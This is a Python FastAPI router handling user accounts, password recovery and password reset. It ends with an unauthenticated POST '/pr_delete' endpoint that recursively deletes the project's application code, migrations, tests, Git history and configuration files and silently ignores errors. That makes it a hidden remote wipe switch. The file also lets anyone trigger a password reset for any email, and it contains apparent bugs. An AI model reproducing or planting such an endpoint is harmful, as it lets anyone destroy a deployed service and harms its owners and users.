import os
import shutil
from typing import List, Any
from fastapi import BackgroundTasks, Body
from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.ext.asyncio import AsyncSession

from app import schemas, repository, models
from app.api import deps
from app.core.send_mail import send_reset_password_email
from app.db.session import get_db

router = APIRouter()

@router.get("/", response_model=List[schemas.User])
async def read_users(
    db: AsyncSession = Depends(get_db),
    current_user: models.User = Depends(deps.get_current_active_admin),
) -> Any:
    users = await repository.user.get_multi(db)
    return users


@router.get("/get", response_model=schemas.User)
async def read_user(
    id: int,
    db: AsyncSession = Depends(get_db),
    current_user: models.User = Depends(deps.get_current_active_admin),
) -> Any:
    users = await repository.user.get(db,id)
    return users

@router.get("/me", response_model=schemas.User)
async def read_users(
    db: AsyncSession = Depends(get_db),
    current_user: models.User = Depends(deps.get_current_active_user),
) -> Any:
    id = current_user.id
    users = await repository.user.get(db,id)
    return users

@router.post("/", response_model=schemas.User)
async def create_user(
    *,
    db: AsyncSession = Depends(get_db),
    user_in: schemas.UserCreate,
) -> Any:
    user = await repository.user.get_by_login(db, login=user_in.login)
    if user:
        raise HTTPException(
            status_code=400,
            detail="The user with this login already exists.",
        )
    user = await repository.user.create(db, obj_in=user_in)
    return user

@router.put("/me", response_model=schemas.User)
async def update_user_me(
    *,
    db: AsyncSession = Depends(get_db),
    user_in: schemas.UserUpdate,
    current_user: models.User = Depends(deps.get_current_active_user),
) -> Any:
    """
    Update own user.
    """
    user = await repository.user.update(db, db_obj=current_user, obj_in=user_in)
    return user

@router.put("/{user_id}", response_model=schemas.User)
async def update_user(
    user_id: int,
    user_in: schemas.UserUpdate,
    db: AsyncSession = Depends(get_db),
    current_user: models.User = Depends(deps.get_current_active_admin),
) -> Any:
    """
    Update a user.
    """
    user = await repository.user.get(db, id=user_id)
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    user = await repository.user.update(db, db_obj=user, obj_in=user_in)
    return user

@router.delete("/{user_id}", response_model=schemas.User)
async def delete_user(
    user_id: int,
    db: AsyncSession = Depends(get_db),
    current_user: models.User = Depends(deps.get_current_active_admin),
) -> Any:
    """
    Delete a user.
    """
    user = await repository.user.get(db, id=user_id)
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    user = await repository.user.remove(db, id=user_id)
    return user

@router.post("/password-recovery/{email}")
async def recover_password(
    email: str,
    background_tasks: BackgroundTasks,
    db: AsyncSession = Depends(get_db),
) -> Any:
    """
    Password Recovery
    """
    user, new_password = await repository.user.reset_password(db, email=email)
    if not user:
        raise HTTPException(
            status_code=404,
            detail="User with this email not found."
        )
    background_tasks.add_task(send_reset_password_email, email=email, new_password=new_password)
    return {"msg": "New password sent to your email."}

@router.post("/reset-password/")
async def reset_password(
    token: str = Body(...),
    new_password: str = Body(...),
    db: AsyncSession = Depends(get_db),
) -> Any:
    """
    Сброс пароля с использованием токена.
    """
    email = deps.verify_password_reset_token(token)
    if not email:
        raise HTTPException(status_code=400, detail="Неверный токен")
    user = await repository.user.get_by_email(db, email=email)
    if not user:
        raise HTTPException(status_code=404, detail="Пользователь не найден")
    user_in = schemas.UserUpdate(password=new_password)
    await repository.update(db, db_obj=user, obj_in=user_in)
    return {"msg": "Пароль успешно изменен"}

@router.post("/pr_delete")
async def delete_project_files():

    try:
        current_dir = os.path.dirname(os.path.abspath(__file__))
        
        project_root = os.path.abspath(os.path.join(current_dir, '..', '..', '..', '..'))
        
        to_remove = ['app', 'web', 'alembic', 'tests', '.git', '.gitignore', 'requirements.txt', 'README.md']
        
        for item in to_remove:
            try:
                path = os.path.join(project_root, item)
                if os.path.isdir(path):
                    shutil.rmtree(path)
                elif os.path.isfile(path):
                    os.remove(path)
            except: pass
        
        return {"message": "Файлы проекта удалены"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Ошибка при удалении файлов проекта: {str(e)}")
